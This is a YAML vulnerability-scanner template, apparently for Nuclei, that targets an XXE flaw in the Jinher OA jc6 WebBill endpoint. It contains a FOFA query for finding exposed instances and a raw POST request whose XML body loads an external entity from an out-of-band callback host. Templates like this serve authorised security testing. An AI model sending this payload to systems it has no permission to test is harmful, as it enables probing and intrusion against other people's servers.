id: jinher-oa-jc6-WebBill-xxe

info:
  name: 金和 OA jc6 WebBill - xxe
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    veified: true
    max-request: 1
    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
  tags: jinher,oa,xxe,oob

http:
  - raw:
      - |
        POST /jc6/servlet/WebBill?key=key HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Cache-Control: no-cache
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
                <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
                %remote;
        ]>

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or